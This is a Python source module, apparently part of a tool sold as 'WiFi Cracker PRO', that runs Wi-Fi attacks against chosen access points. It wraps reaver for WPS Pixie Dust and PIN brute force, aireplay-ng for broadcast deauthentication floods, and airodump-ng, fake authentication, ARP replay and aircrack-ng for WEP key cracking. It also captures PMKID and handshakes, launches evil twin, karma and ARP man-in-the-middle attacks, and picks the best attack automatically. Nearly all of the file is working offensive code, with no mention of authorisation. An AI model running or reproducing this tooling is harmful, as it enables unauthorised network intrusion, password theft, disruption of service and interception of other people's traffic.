#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
T3RMUXK1NG WiFi Cracker PRO - Attack Engine Module
Unified attack orchestration and execution
"""

import os
import time
import threading
import subprocess
from datetime import datetime
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass
from enum import Enum
import queue


class AttackType(Enum):
    """Attack types"""
    HANDSHAKE = "handshake"
    PMKID = "pmkid"
    WPS_PIXIE = "wps_pixie"
    WPS_BRUTE = "wps_brute"
    EVIL_TWIN = "evil_twin"
    DEAUTH = "deauth"
    KARMA = "karma"
    MITM = "mitm"
    WEP = "wep"


class AttackStatus(Enum):
    """Attack status"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    STOPPED = "stopped"


@dataclass
class AttackResult:
    """Attack result data"""
    attack_type: AttackType
    status: AttackStatus
    target: str
    password: str = ""
    cap_file: str = ""
    time_taken: float = 0.0
    error: str = ""
    details: Dict = None
    
    def to_dict(self) -> Dict:
        return {
            'attack_type': self.attack_type.value,
            'status': self.status.value,
            'target': self.target,
            'password': self.password,
            'cap_file': self.cap_file,
            'time_taken': self.time_taken,
            'error': self.error,
            'details': self.details or {}
        }


class AttackEngine:
    """Unified Attack Orchestration Engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.attacks: Dict[str, threading.Thread] = {}
        self.results: Dict[str, AttackResult] = {}
        self.attack_queue = queue.Queue()
        self.callbacks: List[Callable] = []
        self.running = False
        self.stats = {
            'attacks_launched': 0,
            'attacks_successful': 0,
            'attacks_failed': 0,
            'passwords_cracked': 0
        }
    
    def launch(self, attack_type: AttackType, target, 
               options: Dict = None) -> str:
        """Launch an attack"""
        attack_id = f"{attack_type.value}_{target.bssid}_{int(time.time())}"
        options = options or {}
        
        def _run_attack():
            start_time = time.time()
            result = AttackResult(
                attack_type=attack_type,
                status=AttackStatus.RUNNING,
                target=target.bssid
            )
            
            try:
                if attack_type == AttackType.HANDSHAKE:
                    result = self._attack_handshake(target, options)
                elif attack_type == AttackType.PMKID:
                    result = self._attack_pmkid(target, options)
                elif attack_type == AttackType.WPS_PIXIE:
                    result = self._attack_wps_pixie(target, options)
                elif attack_type == AttackType.WPS_BRUTE:
                    result = self._attack_wps_brute(target, options)
                elif attack_type == AttackType.EVIL_TWIN:
                    result = self._attack_evil_twin(target, options)
                elif attack_type == AttackType.DEAUTH:
                    result = self._attack_deauth(target, options)
                elif attack_type == AttackType.KARMA:
                    result = self._attack_karma(target, options)
                elif attack_type == AttackType.MITM:
                    result = self._attack_mitm(target, options)
                elif attack_type == AttackType.WEP:
                    result = self._attack_wep(target, options)
                
                result.time_taken = time.time() - start_time
                
                if result.status == AttackStatus.SUCCESS:
                    self.stats['attacks_successful'] += 1
                    if result.password:
                        self.stats['passwords_cracked'] += 1
                else:
                    self.stats['attacks_failed'] += 1
                
            except Exception as e:
                result.status = AttackStatus.FAILED
                result.error = str(e)
                self.stats['attacks_failed'] += 1
            
            self.results[attack_id] = result
            
            for callback in self.callbacks:
                callback(result)
        
        thread = threading.Thread(target=_run_attack, daemon=True)
        thread.start()
        self.attacks[attack_id] = thread
        self.stats['attacks_launched'] += 1
        
        return attack_id
    
    def _attack_handshake(self, target, options: Dict) -> AttackResult:
        """Handshake capture attack"""
        from core.capturer import HandshakeCapturer
        
        capturer = HandshakeCapturer(self.interface)
        duration = options.get('duration', 120)
        deauth = options.get('deauth', True)
        
        success, cap_file = capturer.capture(target, duration, deauth)
        
        if success:
            return AttackResult(
                attack_type=AttackType.HANDSHAKE,
                status=AttackStatus.SUCCESS,
                target=target.bssid,
                cap_file=cap_file
            )
        
        return AttackResult(
            attack_type=AttackType.HANDSHAKE,
            status=AttackStatus.FAILED,
            target=target.bssid,
            error="Failed to capture handshake"
        )
    
    def _attack_pmkid(self, target, options: Dict) -> AttackResult:
        """PMKID attack"""
        from core.capturer import HandshakeCapturer
        
        capturer = HandshakeCapturer(self.interface)
        timeout = options.get('timeout', 60)
        
        success, pmkid_file = capturer.capture_pmkid(target, timeout)
        
        if success:
            return AttackResult(
                attack_type=AttackType.PMKID,
                status=AttackStatus.SUCCESS,
                target=target.bssid,
                cap_file=pmkid_file
            )
        
        return AttackResult(
            attack_type=AttackType.PMKID,
            status=AttackStatus.FAILED,
            target=target.bssid,
            error="Failed to capture PMKID"
        )
    
    def _attack_wps_pixie(self, target, options: Dict) -> AttackResult:
        """WPS Pixie Dust attack"""
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', target.bssid,
                   '-vv', '-K']
            
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            output, _ = process.communicate(timeout=300)
            
            # Parse for password
            if 'WPA PSK' in output:
                import re
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return AttackResult(
                        attack_type=AttackType.WPS_PIXIE,
                        status=AttackStatus.SUCCESS,
                        target=target.bssid,
                        password=match.group(1)
                    )
            
            return AttackResult(
                attack_type=AttackType.WPS_PIXIE,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error="Pixie Dust attack failed"
            )
            
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.WPS_PIXIE,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error=str(e)
            )
    
    def _attack_wps_brute(self, target, options: Dict) -> AttackResult:
        """WPS PIN brute force"""
        delay = options.get('delay', 1)
        
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', target.bssid,
                   '-vv', '-d', str(delay)]
            
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            output, _ = process.communicate(timeout=7200)
            
            if 'WPA PSK' in output:
                import re
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return AttackResult(
                        attack_type=AttackType.WPS_BRUTE,
                        status=AttackStatus.SUCCESS,
                        target=target.bssid,
                        password=match.group(1)
                    )
            
            return AttackResult(
                attack_type=AttackType.WPS_BRUTE,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error="WPS brute force failed"
            )
            
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.WPS_BRUTE,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error=str(e)
            )
    
    def _attack_evil_twin(self, target, options: Dict) -> AttackResult:
        """Evil Twin attack"""
        # Delegate to EvilTwin module
        from modules.evil_twin import EvilTwin
        
        evil_twin = EvilTwin(self.interface)
        attack_type = options.get('type', 'portal')
        
        evil_twin.start(target, attack_type)
        
        return AttackResult(
            attack_type=AttackType.EVIL_TWIN,
            status=AttackStatus.RUNNING,
            target=target.bssid,
            details={'note': 'Evil Twin running in background'}
        )
    
    def _attack_deauth(self, target, options: Dict) -> AttackResult:
        """Deauthentication attack"""
        count = options.get('count', 10)
        client = options.get('client', 'FF:FF:FF:FF:FF:FF')
        
        try:
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count),
                   '-a', target.bssid, '-c', client, self.interface]
            
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            process.communicate(timeout=30)
            
            return AttackResult(
                attack_type=AttackType.DEAUTH,
                status=AttackStatus.SUCCESS,
                target=target.bssid
            )
            
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.DEAUTH,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error=str(e)
            )
    
    def _attack_karma(self, target, options: Dict) -> AttackResult:
        """Karma attack"""
        from modules.karma import KarmaAttacker
        
        karma = KarmaAttacker(self.interface)
        karma.start()
        
        return AttackResult(
            attack_type=AttackType.KARMA,
            status=AttackStatus.RUNNING,
            target='broadcast',
            details={'note': 'Karma attack running'}
        )
    
    def _attack_mitm(self, target, options: Dict) -> AttackResult:
        """MITM attack"""
        from modules.mitm import MITMAttacker
        
        mitm = MITMAttacker(self.interface)
        attack_type = options.get('type', 'arp')
        mitm.start(target, attack_type)
        
        return AttackResult(
            attack_type=AttackType.MITM,
            status=AttackStatus.RUNNING,
            target=target.bssid,
            details={'note': 'MITM attack running'}
        )
    
    def _attack_wep(self, target, options: Dict) -> AttackResult:
        """WEP cracking attack"""
        try:
            # Start airodump
            output_base = f"/tmp/wep_{target.bssid.replace(':', '')}_{int(time.time())}"
            
            # Capture IVs
            dump_cmd = ['sudo', 'airodump-ng', self.interface,
                        '-c', str(target.channel),
                        '--bssid', target.bssid,
                        '-w', output_base]
            
            dump_process = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Fake authentication
            auth_cmd = ['sudo', 'aireplay-ng', '-1', '0', '-a', target.bssid, self.interface]
            subprocess.run(auth_cmd, capture_output=True, timeout=10)
            
            # ARP replay
            arp_cmd = ['sudo', 'aireplay-ng', '-3', '-b', target.bssid, self.interface]
            arp_process = subprocess.Popen(arp_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for enough IVs
            cap_file = f"{output_base}-01.cap"
            time.sleep(120)  # Wait 2 minutes
            
            # Try to crack
            crack_cmd = ['aircrack-ng', cap_file]
            result = subprocess.run(crack_cmd, capture_output=True, text=True)
            
            dump_process.terminate()
            arp_process.terminate()
            
            if 'KEY FOUND' in result.stdout:
                import re
                match = re.search(r'\[\s*([^\]]+)\s*\]', result.stdout)
                if match:
                    return AttackResult(
                        attack_type=AttackType.WEP,
                        status=AttackStatus.SUCCESS,
                        target=target.bssid,
                        password=match.group(1)
                    )
            
            return AttackResult(
                attack_type=AttackType.WEP,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error="Not enough IVs captured"
            )
            
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.WEP,
                status=AttackStatus.FAILED,
                target=target.bssid,
                error=str(e)
            )
    
    def launch_auto(self, target) -> str:
        """Automatically choose best attack"""
        # Priority order based on success rate and speed
        
        # 1. WPS Pixie Dust (fastest if vulnerable)
        if target.wps and not target.wps_locked:
            return self.launch(AttackType.WPS_PIXIE, target)
        
        # 2. PMKID (no client needed)
        if 'WPA' in target.encryption:
            attack_id = self.launch(AttackType.PMKID, target)
            # Wait briefly
            time.sleep(30)
            result = self.results.get(attack_id)
            if result and result.status == AttackStatus.SUCCESS:
                return attack_id
        
        # 3. Handshake capture
        if 'WPA' in target.encryption:
            return self.launch(AttackType.HANDSHAKE, target)
        
        # 4. WEP
        if 'WEP' in target.encryption:
            return self.launch(AttackType.WEP, target)
        
        return None
    
    def stop(self, attack_id: str = None):
        """Stop attack(s)"""
        if attack_id:
            if attack_id in self.attacks:
                # Set flag to stop
                self.running = False
        else:
            self.running = False
            for thread in self.attacks.values():
                # Threads should check self.running
                pass
    
    def get_status(self, attack_id: str) -> Optional[AttackResult]:
        """Get attack status"""
        return self.results.get(attack_id)
    
    def get_all_results(self) -> Dict[str, AttackResult]:
        """Get all attack results"""
        return self.results.copy()
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return self.stats.copy()
    
    def add_callback(self, callback: Callable):
        """Add result callback"""
        self.callbacks.append(callback)
    
    def export_results(self, format: str = 'json') -> str:
        """Export results"""
        import json
        
        data = {
            'stats': self.stats,
            'results': {k: v.to_dict() for k, v in self.results.items()}
        }
        
        if format == 'json':
            return json.dumps(data, indent=2)
        else:
            return str(data)


if __name__ == '__main__':
    print("Attack Engine Module - Use via main application")
